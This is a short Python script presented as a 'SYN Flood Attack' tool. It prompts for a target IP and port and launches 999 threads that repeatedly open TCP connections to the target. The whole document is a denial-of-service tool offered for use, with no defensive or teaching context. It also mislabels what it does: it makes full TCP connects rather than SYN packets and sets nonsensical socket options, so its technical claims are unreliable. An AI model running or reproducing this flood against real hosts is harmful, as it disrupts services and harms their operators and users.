import socket
import threading

def syn_flood(ip, port):
    for _ in range(9999):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setblocking(0)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 65536)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_FASTOPEN, 65536)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, 65536)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 65536)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 65536)
            
            s.connect((ip, port))
            s.send(b'')
            s.close()
            
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setblocking(0)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 65536)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_FASTOPEN, 65536)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, 65536)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 65536)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 65536)
            
            s.connect_ex((ip, port))
            s.sendall(b'')
            s.close()
        except:
            pass

def main():
    ip = input("> Enter IP: ")
    port = int(input("> Enter Port: "))

    print("\n\nStarting SYN Flood Attack... | xFisher Love Nhi")
    print("Target IP:", ip)
    print("Target Port:", port)
    print("")

    for _ in range(999):
        threading.Thread(target=syn_flood, args=(ip, port)).start()

if __name__ == '__main__':
    main()
